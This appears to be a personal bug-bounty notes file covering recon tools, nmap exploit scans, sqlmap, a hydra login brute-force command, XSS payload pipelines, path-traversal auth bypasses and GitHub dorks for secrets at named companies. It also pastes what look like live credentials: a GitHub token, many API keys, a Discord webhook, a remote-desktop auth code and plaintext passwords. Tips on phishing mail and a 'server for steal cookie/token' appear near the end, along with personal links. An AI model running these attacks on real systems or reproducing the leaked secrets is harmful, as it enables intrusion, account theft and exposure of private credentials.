   - cat urls.txt | grep =h | Gxss -p https://google.com

#nuclei
   - all templates path: cd /home/kali/.local/nuclei-templates
   - nuclei -t ~/.local/nuclei-templates/osint -u testphp.vulnweb.com -o result.txt
   - nuclei -t ~/.local/nuclei-templates/osint -l path/to/.txt-or-url -o result.txt

#clear searching history(firefox): goto setting > privacy security > history sec > del login,cache,cookie,search etc.

#remove words from urls
   - grep -vi "jpg" your_wordlist.txt > filtered_wordlist.txt  [-v: exclude jpg line , i:string]
   - grep -v -f exclude_list.txt your_wordlist.txt > filtered_wordlist.txt [-f: for file]
   - grep -E -f patterns.txt your_wordlist.txt > filtered_wordlist.txt [-E: include/match line]
   - grep -vE "blog|api" your_wordlist.txt > filtered_wordlist.txt [-E only show result which has blog,api in wordlist  ]
   - grep -iE '\.js$' your_waybackurls_output.txt
   - grep -oP '(?<=<strong>)[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(?=</strong>)'  shodan-ip.html

#cutting and extracting
   - awk '{print $1}' fuzz-api.clicktime.txt     [if something in column and row use this]
   - cut -d'/' -f2 fuzz-api.clicktime.txt        [if u want grab only specific part use this like extracting 4th part(api) form url http://evil.com/api/v1]
   - cat words.txt | tr '[:upper:]' '[:lower:]'  [all upper case words/lines convert into lower case word]
   - cat words.txt | sed 's/.*/"&"/'             [add double quote both side of words ex: admin-> "admin" , css-> "css" etc]

add any tool to ur path
   - like root/go/bin in home kali {.bashrc} [https://www.youtube.com/watch?v=1Zxl_e4ZLHE&t=149s]

take look first subdm stage-site like : stage-dev.abc.com , staging.abc.com, api-staging.sbc.com
id param test =sql,xss,
.cfm ext : attempt to dir traversal , use ffuf also
 sqli : website updated info based on the ID parameter
dir brute force : on login page
google dork : p2 leak info

#hydra usage
 -  hydra -L ctf-useranme.txt -p 123456 oyzze6sv.vulnbegin.ctfio.com http-post-form "/cpadmin/login:username=^USER^&password=^PASS^:F=Username is invalid:H=cookie: $cookie" -f -t 10

 [L,P= text file to bt ; l,p= when u know the uname&passwd ; domain without http ; form type separte by colon 1st for PATH:PAYLOAD-SEND:MATCHER-WORD:HEADER ; -f=stop when found]


#tool usage:-
 - paramspider: (provide domain not url)  Paramspider is only crawling for an single subdomain but via this bash script it scan all subdoamin even 2000 in list [for URL in $(</root/recon/target/httpx); do (python3 paramspider.py -d "${URL}");done;]

 - cat js-res.txt | while read url; do python3 ~/bugbounty/my-tool/secretfinder/SecretFinder.py -i $url -o cli >> 9-secretfinder-res.txt; done

 - uncover -q "google.com" -e censys,fofa,shodan,shodan-idb | httpx

 - dnsrecon -d abkz928o.vulnbegin.ctfio.com -D ctf-subdomains.txt -brt [many feature dnsrecon has check]

 - theHarvester -d 32q132ku.vulnbegin.ctfio.com -b all

 - gau --subs --threads 16 --blacklist png,jpg,jpeg,gif,etc > urls.txt

 - cat asn.txt | while read host; do asnmap -json ;done| jq | grep "as_number"

 - nc -vvlp 12345 [listen with netcat port 12345]
 - ./x8 -u http://testphp.vulnweb.com/listproducts.php -w parameters.txt [ it will test listproducts.php?%s , cat reflect it will show colour blue  ]
 - subfinder : subfinder -d hackerone.com -all -recursive > hackerone.com.txt
 - crt  : ./crt.sh -d hackerone.com -o hackerone.com
 - findomain : findomain -t hackerone.com --output [it defalut create output "WA.com.txt" txt in current dir]
 - assetfinder :  assetfinder hackerone.com > hackerone.txt
 - shuffledns :  shuffledns -d hackerone.com -l ~/bugbounty/while-hunting/subdomains-top1million-110000.txt -o hackkk.txt [ERR/not working until u provide "-r resolver.txt" : Program exiting: no resolver list provided]

#github regex
 - AWS /(AKIA[A-Z0-9]{12,})/ path:.env  [ for aws_key,secret,bucket etc ]
 - /.+\.fisglobal.com/ NOT *.fisglobal.com NOT www.fisglobal.com  [for gather subdomains ]
 - /ssh:\/\/.*:.*@.*target\.com/
 - /ftp:\/\/.*:.*@.*target\.com/
 - /(?:https?:\/\/)?(?:www\.)?(?:[\w-]+\.)?uber\.[a-z]{2,}/ NOT /.+\.uber.com/  [*.uber.com all exclude, just show *.uber.jar , *.uber.net ,*.uber.org]

#burp regex
 - (?i)([a-z0-9]+){0,}((_|-){0,}(\\s){0,})(key|pass|credentials|auth|cred|creds|secret|password|access|token|api)(\\s){0,}(=|:|is|>){1,}
 full hunt signin with risabh gmail.com

 #browser https://x.com/ayadim_/status/1630999069790183429 :  regex for extract endpoint from js thread

 https://github.com/settings/tokens : github token [ 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 ]
expire in 30/04/2025

#extra
 - putty.exe to send receive file via ssh (gui)
 - "less" cmd use to read content of file
 - find -iname "*js-content*"        [this start searching from present dir]
 - find . -iname "*content*"         [this start searching from root dir]
 - all default creds uname+passwd : https://github.com/shmilylty/DefaultCreds-cheat-sheet
 - awesome pentesting tool : https://github.com/shmilylty/Pentest-Tools
 - openredir : http://me6.com/aem/xss2.svg [for externeal site popup by todayisnew]
 - kali linux on gui version : https://www.youtube.com/watch?v=kxcpxgfxHH0, https://www.youtube.com/watch?v=QWQ-LQL1owE , or by linuxdroid channel
 - all hacking tools install automaticlly even go (in ubuntu ) : https://www.youtube.com/watch?v=tOOgSxWwKhA

#web archeive tricks
   https://web.archive.org/cdx/search/cdx?url=*.clicktime.com&fl=original&collapse=urlkey&filter [show clean result]
   https://web.archive.org/cdx/search/cdx?url=*.clicktime.com&fl=original&collapse=urlkey&filter=mimetype:application/javascript [for js only]
   https://web.archive.org/cdx/search/cdx?url=*.clicktime.com&fl=original&collapse=urlkey&filter=mimetype:image/png [show filtered result like png]
   https://web.archive.org/cdx/search/cdx?url=*.clicktime.com&fl-original&collapse=urlkey [result garbish]

#TIPS AND TRICKS
 Using paramspider, gxss to detect Cross-site Scripting (XSS)
 - cat params | qsreplace yogi | dalfox pipe — mining-dom — deep-domxss — mining-dict — remotepayloads=portswigger,payloadbox — remote wordlists=burp,assetnote -o xss.txt
 - cat live.txt | waybackurls | gf xss | uro | httpx -silent | qsreplace ‘“><svg onload=confirm(1)>’ | airixss -payload “confirm(1)” | tee xss1.txt
 - cat 4.1-gxss.txt | grep "debijenkorf.nl" |sed 's/Gxss/javascript:prompt(1)/g' | airixss -payload "prompt(1)" [this is how i use]
 - change content-type: application/x-url-encoded to application/json [change body type in json format]
 - grep -RoP "(\/[a-zA-Z0-9_\-]+)+"  : via this u can extract the endspoint from js.txt found form wayback,gau,katana
 - cat target.txt| httpx -ip | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'    [Extract IPS From list of domains and then you can conduct your FUZZ/Manually check them for SDE /BAC , Ports , ..etc ]
 - if u found a domain running on http and port 8443 redir to admin login and then u redir else were , fuzz param and use param to path traversal and download data src file etc
 - ping google.com : to grab quickly origin ip
 - if u run ffuf and the word exist but not hit , it means u need to slow down the req
 - use sudomy it extract all parameters at one place to test xss and open redir : /Sudomy/output/09-25-2023/amc-forum.de/wordlists/wordlist-parameter.lst
 - asn grab and basic info : https://bgp.he.net/dns/facebook.com#_ipinfo
 - struts2 cve vulnerabilty = .action, .do , .go
 - cat uber_js.txt | xargs -I @ bash -c 'python3 linkfinder.py -i @ -o cli' | python3 collector.py uber/output [https://github.com/NagliNagli/Bug-Bounty-Toolz/blob/master/collector.py]
 - I've been able to bypass an authentication page by doing path traversal like this: website/admin/api/..;/..;/admin/
 - injection type vuln : grab all urls from paramspider , result.txt use arjun/x8 tool by bash ( https://www.youtube.com/watch?v=sy2WKcE_N7E) ( https://www.youtube.com/watch?v=vTd4d7XWo7I )
 - combine all js files and extract params name : grep -Eo '(var|let) ([A-Za-z0-9_]+){2,}' -R js-files | cut -d' ' -f2
#cve
 - site for deatil and latest cve found : https://attackerkb.com/topics/FGlK1TVnB2/cve-2024-21893/rapid7-analysis
 CVE-2022-26134 [https://github.com/abhishekmorla/CVE-2022-26134] [https://www.youtube.com/watch?v=mNBCMUNUn_U : utube]
  - easy to exploit , atlanssion , full automate
  - http.favicon.hash:1484947000,1828756398,1170495932   [quick search all hash in shodan]
#make quick search query for uncover :
 - cat asn.txt | while read ASN; do echo "'http.title:ivanti' ssl:'att.com' asn:'$ASN'"; done
 - cat test | while read test; do echo "https://www.shodan.io/search?query=http.favicon.hash:'-1439222863'+asn:$test"; done

#js
  https://github.com/NagliNagli/Bug-Bounty-Toolz/blob/master/getjswords.py [nagli script: getjswords.py]
  combine all js files and extract params name : grep -Eo '(var|let) ([A-Za-z0-9_]+){2,}' -R js-files | cut -d' ' -f2

#xss
 - script tag under iframe use when csp is enabled img tag that time not work [https://www.youtube.com/watch?v=-856s1vnWHU&t=526s]

#ssrf
   - a user test use localhost wdlist for to test ssrf bcs wappelyzer show it running on aws ,s3bucket.so he use internal aws ip 169.254.169.254


#installation:-
   -> problem with go tool: cannot find GOROOT directory: /usr/lib/go
   -> solution: export GOROOT=/usr/local/go  , export PATH=$GOPATH/bin:$GOROOT/bin:$HOME/.local/bin:$PATH
   -> npm install -g js-beautify , js-beautify all-js-content.js -o beautified-js-content.js (USAGE)
   -> cent : go install -v github.com/xm1k3/cent@latest && cent init && cent -p cent-nuclei-templates
   ->

#install kalil linux in ubuntu
 from linuxdroid vdo
 cat /etc/apt/sources.list
 nano /etc/apt/sources.list
 wget -q -O - https://archive.kali.org/archive-key.asc |sudo apt-key add
 apt-key list
 apt update
 apt dist-upgrade
 cat /etc/os-release

#automatic report generation : poe_api [https://twitter.com/0xHunX/status/1662458195397296128]
#automate : https://youtu.be/7ogiwKaIvxw?si=p-vK1bx0FXkG3ZaN  [axiom, at scale, multiple vps at once, multiple fuzz]
#pII data
   - site:"docs.google.com/spreadsheets/" westernunion.com
   - site:"groups.google.com" tesla.com

 #gcp copy files to ur pc :
   - python3 -m http.server [via this cmd port http://0.0.0.0:8000/ open for listen just open in browser and access the files.]

#orwa
  shodan dork http.title : IIS, tomcat,
  github dork
  att.com pwd, token, passw, ldap, pw ,secret, private, key, gist.github 8:50       [ language:shell language:PHP language:Python language:JavaScript ]
  - att.com secret NOT about:att NOT www.att NOT dev.att NOT api.att NOT research.att NOT [via this exclude "att,user" this type only show att.com ]
  - att.com language:bash language:python language:ruby
  - acess and secret key of aws service give ony for 6 month
  - user:Assasionxyz first name , email , linkedin [if coder use fake name use this type of dork to get real name ]
  sqli test
  - make response manuplation 200 ok , active scan, get ot post
  - at param, param itsel, url, upload
  - url.com/?id=1'
  - sqlmap -r req.txt
  - sqlmap -u "url.com/=1" [it check both both side of equal sign]
  - add "*" star, it use when no param inj found [may be it check all req body]

  tools by orwa
  - domaincollector, naabu , subdomainer, frogy ,rengine

  orwagodfather wordlist : sqli, apm, fuzz,ssti etc
--------------------------------------------------------------------------------------------
PATH TRAVERSAL CONCEPT
 > v1/api/token/..;/ [show 404]
 > v1/api/token/..;/..;/ [do this until show different response like 400 , means u reach the starting point reverse proxy]
 > v1/api/token/..;/..;/FUZZ [then fuzz]

path traversal real life use by hackers
 - I've been able to bypass an authentication page by doing path traversal like this: website/admin/api/..;/..;/admin/ [hussein daher]
 - [/api/v1/sms/..;/..;/? --> 404 Not Found (in json)
   /api/v1/xdxd/..;/..;/ --> different 404 page (html)
   Learn to identify patterns.The first one is traversing the API ( http://sms-api.target/api/FILE ) and the 2nd one is just current-host/api/FILE.]
--------------------------------------------------------------------------------------------
SUDOMY :- (use this tool by going under the tool , it create auto subdir by date)
 -  ./sudomy -d debijenkorf.nl -dP -eP -rS -cF -gW --httpx -aI webanalyze -sS
 - ./sudomy -d example.com -dP -tO -cF -sC -gW --slack -nT --httpx --html

--------------------------------------------------------------------------------------------
NAABU PD
 - naabu -host google.com  [not http://google.com] [it just scan ports quickly nothing else]
 - naabu -host google.com -p 0-65635 OR -p 80,443 []
 - naabu -host google.com -top-ports 50 -host google.com [default it scan 1000 top ports]
 - naabu -host google.com -top-ports 5000 -exclude-ports 80,443,23
 - naabu -host 192.14.2.56 --passive [some time resul show error so use passive option]
 - naabu -list target.txt -sa [scan all ip /24]
 - naabu -list target.txt [give all domain to scan without https:// format, just give fb.com ,insta.com, gogole.com]
 - cat target.txt | naabu -nmap-cli 'nmap -sV -oX nmap-output'  [via -nmap-cli u can use nmap all works like version and script scan ]
 - naabu -list target.txt -resume [resume scan using resume.cfg]
 - mine:  cat ~/adi/world/livedmn.txt | while read host; do python3 paramspider.py -d $host; sleep 10; done
--------------------------------------------------------------------------------------------
NMAP
 - nmap -sV google.com or 127.0.0.1                            [probe service/version info ]
 - nmap target.com --top-ports 500
 - nmap -p 1-65535 --script vuln "dev.clicktime.com"           [vuln script scan]
 - nmap -p 1-1000 --script exploit "sub.domain.com"            [ vuln explot port scan]
 - nmap -p- -T3 --max-rtt-timeout 500ms -Pn -6 -A --traceroute 1-TARGET_IP_OR_HOST [max-rtt: for T3 slow down the scan but give u fast result] [--traceroute : no. of node packet passes to reached]
 - nmap -p- -T3 --max-rtt-timeout 500ms -Pn -6 -A --traceroute -iL host_list.txt [-il: for list of tagets want to scan] [-Pn: for Treat all hosts as online (skip host discovery/httpx)]
 -  --resume  --min-parallelism/max-parallelism --min-hostgroup/max-hostgroup [i dont know much but here some useful thing u can try in future]
 - nmap target.com -p T:443 U:53                               [specify tcp and udp ports]
 - if u want to resume the progress just run cmd again not it will checks before continuing the scan and resume.

for script:-
nmap -p- --script=vuln $IP
nmap -p- -sC -sV $IP --0pen
nmap -n -sV --script "ldap* and not brute" $ip  [star show all ldap script run but not go for brute force creds]
nmap --script ftp-* http://hackxpert.com   [star show all ftp script run]
nmap --script discovery -sV $ip
nmap --script hostmap-crtsh.nse http://domain.com [extract subdomains]
nmap --script=* [run all scripts for scan]
https://x.com/cyb_detective/status/1668912402270699520/photo/1

@GodfatherOrwa : naabu -list sub.txt -top-ports 1000 --exclude-ports 80,443 -o file [ after use vuln script and exploit]
                  : naabu -list subdomain-list.txt -p - -exclude-ports 80,443,8080,22,25 -o result.txt

----------------------
dalfox
 - its not compulsory that every time it show same result
 - [v] : execute successfully
 - [G] : for sql error
 - [w] : it found param but not payload to inject give some time to bypass bcs reflected somewhere
 - [I] : for investigating
 - zinho server
usage : dalfox [mode] [target] [flags]
 - dalfox url domain.com OR http://domain.com > output.txt
 - dalfox file url.txt --no-colour > output.txt
 - dalfox file urls.txt --user-agent list.txt > output.txt
 - dalfox file url.txt --waf-evasion > output.txt [speed worker=1 and delay=3 by using waf param]
 - dalfox server [just typing this, it work like burp collabrator tool, it give u a link to inject {img src=http://127.0.0.1:6565 onerror=alert(1)}]
 - dalfox file urls.txt -b 127.0.0.1:6565 > output.txt [-b for for blind payload]
 - dalfox file url.txt --custom-payload my_payload.txt > output.txt
 - dalfox file url.txt --deep-domxss > output.txt
 - dalfox file url.txt --follow-redirects > output.txt
 - dalfox file url.txt --only-discovery > output.txt [only param analysis like kxss,gxss , it skip-xss-scanning]

 dalfox file params-result.txt -b xss.report/c/enterlectury --proxy http://127.0.0.1:8080 -o dalfox-result.txt | tee dalfox-output.txt [i use ]

 dalfox file 2.1 --no-colour --user-agent -b --deep-domxss --follow-redirects --only-discovery | tee -a dalfox.txt [my useful cmd]

 dalfox pipe -b <you blind xss> — custom-payload <your payload> -w 300 — multicast — mass — only-poc -o xss_vulns.txt [medium se uthaye h]

-----------------------------------------------------------------------------------------------------------------
for quick xss checking bugs [paramters]
 - utm_= , goto= ,redir=

test for openredir
   - payload : javascript://%0aalert(1)
   - encode url, change redir= to true in burp,
use xsstrike , if has proxy connrct setting ffk
use dalfox , if u have huge target wordlist . it test xss for each site parallel
-----------------------------------------------------------------------------------------------------------------


-------------------------------------------------------------------------------------------------------------------------------------
                                          ⭐⭐ NUCLEI TEMPLATE ⭐⭐-->
subdomain takeover nuclei
    - gather all subdomains by amass etc, use httpx ,run nuclei on all result of httpx. [give only domains] [not give urls] {https://technoxi.medium.com/subdomain-takeover-41efa293b1b7}
zip-backup-file
    - gather all subdomains by amass etc, use httpx ,run nuclei on all result of httpx. [give only domains]
token-info-leak
    - specify urls.txt
cves dir
    - some cves need live domains and some base urls, so give urls.txt
js
    - js-analyse.yaml [give urls]
technology
      - http/technologies [host] https://github.com/projectdiscovery/nuclei-templates/blob/29edb66f1d35dc17ef6663db27e4367a94b9d1fc/http/technologies/tech-detect.yaml#L2611
headless
    - give urls.txt [all template use]
wordlist dir
    - wp-user, passwd, theme, plugin, admin-path.txt
keys
    - if u want profile info ,to grab key,file,token,profile from google-mailcheap it gather from 120 sites
malware
    - for mobile test with nuclei
language dir
    - php , python, perl etc [direct use for specific site]
webshell dir
    - only for php,asp,jsp sites
xss
    - dom only
payload dir
    - cmd injection and request-header [while application manual testing]
exposed-panels dir
    - give urls.txt
exposures
    - give domains only
fuzzing
    - wcd, waf ,host-header, ssrf, xff etc  [give separately values to identify these vuln]
miscellaneous
    - old-copyright.yaml (Find Pages with Old Copyright Dates) , htaccess-config.yaml
misconfiguration
    -  use specific from in this apache,akamai,phpmyadmin,ngnix,proxy,hp,jenkin etc


-----------------------------------------------------------------------------------------------------------------
SUBFINDER API KEYS [/home/tiktoknightclub/.config/subfinder/provider-config.yaml]

bevigil:
  - TKXUOkqdB9lrZBVk
binaryedge:
  - 7qv13x5jyb@drowblock.com
bufferover:
  - WckjTtAIH51PN1SjL7WBQCcthD9egF5Q0UxPOZ70
builtwith: []
c99: []
censys: []
certspotter:
  - k50559_9o28XEIuwLQqwrOtNMvc
chaos:
  - RwdoJW6OfasdMwYDmNVNCg7vvhkP0qt2ZDgP5Y1skwArU2ei10MgDVX99ZRTv5tV
chinaz: []
dnsdb: []
dnsrepo:
  - bf1eb5ad4fbadfa61482ff505262
facebook: []
fofa:
  - c9daa78930c7274bf9b700582a71a820
fullhunt:
  - 2c3d870f-d30d-4532-b6a7-23284daf2542
github:
  - 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
hunter: []
intelx: []
leakix: []
netlas: []
passivetotal: []
quake:
  - bf6fdbeb-d6f4-4558-b1b8-77d420000fdb
redhuntlabs: []
robtex: []
securitytrails:
  -  bLaKu8nqxbm6j552O0_Fbg_kWCqRas0I
shodan:
  -   MJnZIA98FMa42aAO5OOz0vqrcte24SaO
threatbook: []
virustotal:
  - b0c92c80553bf2e87df7e8259625f5932ed1ae06ee92e1b1c9ec7d096849b518
whoisxmlapi: []
zoomeyeapi: []

#gcp , remote-desktop , cloud ,google
    sudo bash -c 'echo "exec /etc/X11/Xsession /usr/bin/xfce4-session" > /etc/chrome-remote-desktop-session'

     DISPLAY= /opt/google/chrome-remote-desktop/start-host --code="4/0AfJohXl-fLIdfJHmxAbNDlk9AkalsDLFeU1LfHlvOot1Ovr01tT_Qh7PCMmxozNoY24RIg" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$(hostname)

     1234567890 : pin ssh

     df -h byebyebablade/ [available space in system, look at "/home" of "Mounted on"]
     du -h ~/ | sort -rh | head -n 10 [it show availble and occupy space both recursively]
     df -h byebyebablade/           AND     du -h ~/ | sort -rh | head -n 10

#ubuntu setup
   - user/passwd: aditya1/aditya1
   - ls /mnt/  : mnt is main pc location where C,F,G,H drive, u can direct acces ur pc file/folder by "cd /mnt/c"
   - wsl -l -v : type in cmd promt to check distibution
   - if u want to use multiple terminal goto cmd prompt -> wsl --install -> new ubuntu terminal open

https://www.youtube.com/watch?v=ivF1_aUqSDI&ab_channel=TechyCricketer  [wsl, change-drive, linux]


 for create a file
 - nul > file.txt
 - echo content > file.docx
 - notepad file.txt
more filename.txt     [for display content of file]
del filename.txt         [for delete a file]
mkdir foldername     [for create folder]
rmdir foldername      [for delete]
shift+f7                       [display all previous/history cmd u used]
shift+f8                       [move to previous cmds]
shift+f9                       [enter cmd num to reach direct ]

windows cmd
 - winver : know windows version
 - wsl --set-default-version 2

linux
xdg-open file.html [for open any file in default browser]


mail tester : for checking ur score for phishing that ur mail not go to spam folder.
https://in.000webhost.com/ : use for hook website [open redir, xss etc]
yandex : for mail sending
freenom : for free domain purchase
smt2go : for sending mail differnetly
pipedream : server for steal cookie/token online

reports and payloads
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web

-----------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------
FOR OTHER

# bca exam pattern
   https://www.youtube.com/watch?v=tmMbABgg9Go

theory :
I can’t describe my happiness that I got after receiving this awesome notification . I was finally able to buy an awesome Laptop with the help of this bounty from Facebook . So I thank Facebook Security team for this wonderful experience . I was like this to myself.


 VIDEO
https://www.youtube.com/watch?v=gu2rYMLFfvQ
https://www.youtube.com/watch?v=JD1sTmWUsrA&list=WL&index=10
https://github.com/GJFR/epub-specs/tree/main/epub33
https://github.com/projectdiscovery/interactsh


-----------------------------------------------------------------------
posibilities
how normal hacker pentest
 - they just focus on websites
 - they are look for easy bugs

how u increase ur possibilities
 1. go for cidr or api pentest
 2. try all but focus on few vuln
 3. try in different browser


----------------------------------------------------------------------------------------------------------------------------------------------

https://www.instagram.com/dhruvmishra7903/
https://www.instagram.com/unique_cho.ri/
https://www.instagram.com/anni_pandat_3543/
https://www.instagram.com/im.harsh_roy/
https://www.instagram.com/itz_._gunnu__._/
https://www.instagram.com/game_changer_rohit_07/   [ pratappur panchayat ]
https://www.instagram.com/aannybelle_/
https://www.instagram.com/anshu__singh_rajput_1k/
https://www.instagram.com/dhiraj_raj_261/

--------------------------------------------------

quote:
 - suddenly, we're strangers again.
 - Everything is difficult at the beginning, and it continues to be difficult from the beginning...
 - I will never give up on my dreams , there is only two choices i will become billionaire or i will try untill i die.
 - We have tomorrows for reason😊
 - once my father said kaam aisa karo ki mai tumhare jaisa banu naki beta baap jaisa .



Meri baatein kon leak kr rha h badtameez 😶‍🌫️

ppu result sggs/coc/clgfrom here
 https://lu.indiaexaminfo.co.in/PATLIPUTRA/YEAR-2024/UG/BSC(SEM-II)/2422251070121.pdf
 roll no generator : https://pinetools.com/generate-list-numbers



⢀⢀⢀⢀⢀⢀⢀⢀⢀⣶⣷⣶⡀
⢀⢀⢀⢀⢀⢀⢀⢠⣾⣿⣿⣿⣿⣿⣆
⢀⢀⢀⢀⢀⢀⢀⣿⡿⣿⣿⣿⣿⣿⣿⡆
⢀⢀⢀⢀⢀⢀⢀⢻⣿⣿⣿⣿⣿⣷⣿⠇
⣤⣴⣾⣤⣤⣴⣷⣮⣿⣿⣿⣿⣿⣿⣿
⢀⢸⣿⡏⢀⢠⣽⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄
⢀⣿⣿⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠈⢿⣿⡿⠿⠛⠉⠻⣿⣿⣿⣿⣿⣿⡿⠛⠁
⢀⢀⠁⢀⢀⢀⢀⢀⣿⣿⣿⣿⣿⣿⠁
⢀⢀⢀⢀⢀⢀⢺⣶⣿⣿⣿⣿⣿⣿⣄⣀
⢀⢀⢀⢀⢀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
⢀⢀⢀⢀⢀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
⢀⢀⢀⢀⢀⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀
⢀⢀⢀⢀⢀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡍
⢀⢀⢀⢀⠐⠿⡏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
⢀⢀⢀⢀⢀⣼⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠃
⢀⢀⢀⢀⢀⢀⢀⢀⣿⣿⣿⣿⣿⣿⣿⣿⠟
⢀⢀⢀⢀⢀⢀⢀⢀⢿⣿⣿⣿⣿⠿⠏⠁
⢀⢀⢀⢀⢀⢀⣀⣠⣾⡿⣿⣿⠃
⢀⢀⢀⢀⢀⢀⢿⣿⠋⢀⢻⡿
⢀⢀⢀⢀⢀⢀⢺⡇⢀⢀⣾⣇
⢀⢀⣠⣤⣤⣤⣤⣿⣤⣴⣿⣿⣤⣤⣤⣤⣤⣤⣤⣄
⢀⢀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉


----------------------------------

📌 INSTALL RENEGINE

git clone
sudo apt-get install build-essential
apt-get -y install make
sudo install make
nano .env [change country,state,city]
sudo apt install docker-compose
make certs
make build
{for docker error
 - sudo service docker start
 - sudo apt update
 - sudo apt install docker.io
 - sudo systemctl start docker
 - sudo systemctl enable docker
 - docker --version
 - sudo usermod -aG docker $USER
}

------------------------------------

basic cmd of docker

-> docker pull kalilinux/kali-rolling [pull img from docker hub]
-> docker run -it --name kali-1 kalilinux/kali-rolling [from img create multiple containers, example img kali -> multiple cont kali1,kali2,kali3  it->interactive mode]
-> docker exec -it kali1 /bin/bash [already run in prvious cmd here we access in betwn process]
-> docker ps -a [ ps display container and -a for unused img] [means display both imgs running and stopped]
-> "docker start kali-1"  Or  "docker stop kali-2" Or "docker rm -f kali-1"
-> docker system prune -a --volumes [-a for unusued img and --vol for vol/cache]
-> docker rename kali kali-nuclei [kali-nuclei is updated name]
-> docker update --memory=800m --memory-swap=1gb kali-nuclei [provide swap-memory apprx to memory]
-> docker cp ./file.zip kali-1:/root/file.zip [from vps to docker]
-> scp -P 22 .\Desktop\cent-template.zip  root@139.59.93.216:/home/aditya/ [local to vps]
-> sudo apt install -y build-essential [install all basic tools of kali like nano etc]
-> nuclei -t ~/nuclei-templates/ -l subfi.txt -debug [debug the procress]
---------------

📌 #Installing Docker on Kali Linux

#sudo apt update
#sudo apt install -y docker.io
#sudo systemctl enable docker --now
#docker

# sudo curl -L -i  https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m) -o /usr/lpcal/bin/docker-compose


#Download the latest stable version of docker-compose

#sudo curl -L "https://github.com/docker/compose/releases/download/v2.30.3/docker-compose-linux-x86_64" -o /usr/local/bin/docker-compose

#sudo chmod +x /usr/local/bin/docker-compose

#sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose

#docker-compose --version

#https://rengine.wiki/install/detailed/

#git clone https://github.com/yogeshojha/rengine && cd rengine

#sudo make certs

#sudo make build

#sudo make up

#sudo make username

#sudo make logs

------------------------

📌 INSTALL KALI LINUX IN UBUNTU
 from linuxdroid vdo
 cat /etc/apt/sources.list
 nano /etc/apt/sources.list
 wget -q -O - https://archive.kali.org/archive-key.asc |sudo apt-key add
 apt-key list
 apt update
 apt dist-upgrade

---------------------------------------------------

gmail : adityakr56@outlook.com
username :adityakr56@outlook.com
password : adityakr56


---------------------------------------------------------------

📌 WPSCAN
        gem uninstall wpscan
        ruby --version   [install if not present bu apt install ruby]
        gem install bundler
        git clone https://github.com/wpscanteam/wpscan.git && cd wpscan && bundle install --without test

----------------------------------------------------------------
📌CENT
go install -v github.com/xm1k3/cent@latest
cent init
cent -p cent-nuclei-templates

------------------------------------
📌 GF patterne install
▶ go install github.com/tomnomnom/gf@latest
▶ echo 'source $GOPATH/src/github.com/tomnomnom/gf/gf-completion.bash' >> ~/.bashrc
▶ mkdir .gf
▶ cp -r $GOPATH/src/github.com/tomnomnom/gf/gf-completion.bash ~/.gf
▶ cd ~
▶ git clone https://github.com/1ndianl33t/Gf-Patterns
▶ mv ~/Gf-Patterns/*.json ~/.gf
▶ echo https://testphp.vulnweb.com/ | waybackurls | sort -u | gf xss | tee gfptn.txt

---------------------------------------
📌 GF patterne install 2

$ go get -u github.com/tomnomnom/gf
$ cp -r $GOPATH/src/github.com/tomnomnom/gf/examples ~/.gf

Note : Replace '/User/levi/go/bin/gf' with the path where gf binary is located in your system.

$ alias gf='/User/levi/go/bin/gf'
$ cd ~/.gf/

Note : Paste JSON files(https://github.com/PushkraJ99/paramspider/tree/master/gf_profiles) in ~/.gf/ folder

Now run ParamSpider and navigate to the output directory

$ gf redirect domain.txt //for potential open redirect/SSRF parameters
$ gf xss domain.txt //for potential xss vulnerable parameters
$ gf potential domain.txt //for xss + ssrf + open redirect parameters
$ gf wordpress domain.txt //for wordpress urls

[More GF profiles to be added in future]

---------------------------------------------------------
📌 NOTIFY TOOL (projectdiscovery) on digitalocean vps

wget "notify_1.0.6_linux_amd64.zip"     [GO tools not install]
unzip "notify_1.0.6_linux_amd64.zip"
sudo mv ./notify /usr/local/bin/notify  [still i not access it from anywhere]
notify --help
echo $PATH                              [check path "/usr/local/bin/" exist in-> sbin:/usr/local/bin ]
export PATH=$PATH:/usr/local/bin        [via this-> bin:/usr/local/bin ]
mkdir ~/.config/notify/provider-config.yaml
notify --help                           [install succesfully]
USAGE : nuclei -l target.txt -t templates.yml | notify -pc ./provider-config.yaml

[format of provider-config.yaml](https://github.com/projectdiscovery/notify/issues/378)
       discord:
         - id: "discord-gatehub"
           discord_channel: "automation"
           discord_username: "gatehub1"
           discord_format: "{{data}}"
           discord_webhook_url: "https://discord.com/api/webhooks/1266728638783688716/SfdZmh2rLhE1sqLQuLBUZlnCgZViFig51tPJoFu-lx-W8Be89bodpPiqj77yU0GU2y7Z"

        - id: "subs"
          discord_channel: "subs"
          discord_username: "test"
          discord_format: "{{data}}"
          discord_webhook_url: "https://discord.com/api/webhooks/XXXXXXXX"
-------------

📌 steps to exlude wordfence template from cent:
1. after sucessfully install all templates in pc
2. go to wordfence site and downlaod zip -> https://github.com/topscoder/nuclei-wordfence-cve/
3. unzip and collect all differnt yml path -> find . '\.yaml' | grep '\.yaml'  (here u save path at one place from differnt dir .'/cent/path/wp-config.yaml')
4. collect name( id name) cmd   -> awk -F'/' '{print $NF}' > yaml-id-exclude.txt ( here u save id-name 'wp-config.yaml')
5. exclusion: xargs -a yaml-id-exclude.txt -I{} rm -f cent/path/{}  (here it iterate to remove one by one)

---------------------------------------------------

📌 steps to exlude "/readme.txt" from wordfence template
